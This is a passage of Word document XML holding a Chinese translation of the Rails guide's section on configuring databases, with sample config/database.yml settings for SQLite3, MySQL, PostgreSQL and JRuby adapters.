          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>true</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67CCAA53"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3.12 配置数据库</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31AF27CA"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几乎所有 Rails 应用程序都会和数据库交互。 数据库在一个叫做 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/database.yml</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的文件里被指定的。 如果你在一个新的 Rails 应用里打开这个文件，你会看到一个默认数据库配置为 SQLite3。 该文件包含三个部分，分别是不同的 Rails 运行环境：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="279650F8" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="22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development</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 环境用于你的开发或本地电脑,所以你可以手动控制应用程序。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CACF2BD" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="22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test</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 环境用于运行自动测试的时候。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21E922CA" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="222"/>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production</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 环境用于部署应用程序给全世界用的时候。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07E868F7"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你不必手动更新数据库配置文件。如果你查看应用程序生成器的选项, 你会发现其中一个选项为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>—database</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. 这个选项允许你选择一个适配器，这个适配器可以是最常用的关系型数据库。你甚至可以重复运行生成器: </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>cd .. &amp;&amp; rails new blog —database=mysql</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. 如果你确认重写 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/database.yml</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 文件， 你的应用程序将被配置使用 MySQL 而不是 SQLite. 常用数据库连接的详细例子会在下面说到。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A0F8D70" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="4"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>3.12.1 配置 SQLite3 数据库</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41B20D5B"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Rails 内建支持 </w:t>
      </w:r>
      <w:hyperlink r:id="rId876" w:history="1">
        <w:r w:rsidRPr="005A4264">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>SQLite3</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, SQLite3 是一个轻量型，不需要服务器的数据库应用程序。在一个繁忙的生产环境中应该会使其过载，但在开发和测试环境会运作的很好。创建一个新项目的时候，Rails 会默认使用 SQLite 数据库，但你可以随后自行修改.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66B725B6"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下面这部分是默认配置文件中开发环境的连接信息:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4320"/>
      </w:tblGrid>
      <w:tr w:rsidR="005A4264" w:rsidRPr="005A4264" w14:paraId="7E7E0A57" w14:textId="77777777" w:rsidTr="005A4264">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1B2EA62A"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development:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="67A95413"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adapter: sqlite3</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="660B4D4B"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database: db/development.sqlite3</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5AA121C4"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pool: 5</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="72994F24"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timeout: 5000</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="445FABF5"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Rails 默认使用 SQLite3 数据库存储数据是因为它是一个不需要配置就能工作的数据库。Rails 也支持 MySQL 和 PostgreSQL, 并且有许多其它数据库的插件。如果你在生产环境中使用数据库，Rails 通常都能为其提供一个适配器.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2554B5B0" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="4"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>3.12.2 配置 MySQL 数据库</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DCAF90E"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如果你选择 MySQL 而不是已有的 SQLite3 数据库，</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/database.yml</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 将会有些不同。下面是开发环境部分：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3600"/>
      </w:tblGrid>
      <w:tr w:rsidR="005A4264" w:rsidRPr="005A4264" w14:paraId="513170C7" w14:textId="77777777" w:rsidTr="005A4264">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2EC158F1"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development:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4A7DDAA2"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adapter: mysql2</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="593964D2"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encoding: utf8</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="09DDC2AE"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database: blog_development</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1B824064"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pool: 5</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6EECF220"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username: root</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="13119F80"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password:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2620BE4E"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socket: /tmp/mysql.sock</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="70C07634"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如果你的开发电脑安装的 MySQL 有一个没有密码的 root 用户，你可以使用这个配置。不然，在开发环境部分的更改相应的 username 和 password。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2283A905" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="4"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>3.12.3 配置 PostgreSQL 数据库</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FF7EFAC"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如果你选择 PostgreSQL，</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/database.yml</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 要被自定义使用 PostgreSQL 数据库：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3600"/>
      </w:tblGrid>
      <w:tr w:rsidR="005A4264" w:rsidRPr="005A4264" w14:paraId="2FB42484" w14:textId="77777777" w:rsidTr="005A4264">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="55B25E91"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development:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="36E2CCA6"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adapter: postgresql</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="35D1CC54"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encoding: unicode</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4C988C0E"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database: blog_development</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1341D140"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pool: 5</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5F0547C2"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username: blog</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="689ED090"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password:</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2CE9ADA0"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如果你使用外部的连接池管理的话，你可以取消 Rails 的 prepared statements:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3600"/>
      </w:tblGrid>
      <w:tr w:rsidR="005A4264" w:rsidRPr="005A4264" w14:paraId="27AAB336" w14:textId="77777777" w:rsidTr="005A4264">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1BB6AC84"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production:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4A05122E"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adapter: postgresql</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3F973A77"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prepared_statements: false</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5AA9D923" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="4"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>3.12.4 为 JRuby 平台配置 SQLite3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40FBE83C"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如果你选择使用 SQLite3 并且使用的是JRuby, </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/database.yml</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 将会有一点不同。这是开发环境部分：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4320"/>
      </w:tblGrid>
      <w:tr w:rsidR="005A4264" w:rsidRPr="005A4264" w14:paraId="7CB9A66D" w14:textId="77777777" w:rsidTr="005A4264">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1B091B71"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development:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="476E8921"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adapter: jdbcsqlite3</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="768F90F9"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database: db/development.sqlite3</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="79329B1B" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="4"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>3.12.5 为 JRuby 平台配置 MySQL</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25755039"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如果你选择使用 MySQL 并且使用的是JRuby, </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/database.yml</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 将会有一点不同。这是开发环境部分：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3600"/>
      </w:tblGrid>
      <w:tr w:rsidR="005A4264" w:rsidRPr="005A4264" w14:paraId="67848833" w14:textId="77777777" w:rsidTr="005A4264">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="20936676"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development:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="51CE88D8"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adapter: jdbcmysql</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7B64A759"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database: blog_development</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5F74FC36"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username: root</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="25FC9FA0"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password:</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="626A0CE1" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="4"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>3.12.6 为 JRuby 平台配置 PostgreSQL</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="197CF359"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如果你选择使用 PostgreSQL 并且使用的是JRuby, </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/database.yml</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 将会有一点不同。这是开发环境部分：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3600"/>
      </w:tblGrid>
      <w:tr w:rsidR="005A4264" w:rsidRPr="005A4264" w14:paraId="103759A1" w14:textId="77777777" w:rsidTr="005A4264">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="69906E7A"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development:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="64EB33A8"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adapter: jdbcpostgresql</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2E299F1B"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encoding: unicode</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0DC997F1"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database: blog_development</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="09D6B6D2"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username: blog</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0D304798"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password:</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="36762CF0"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修改 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>development</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 部分相应的用户名和密码。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EA6B68C" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="2"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
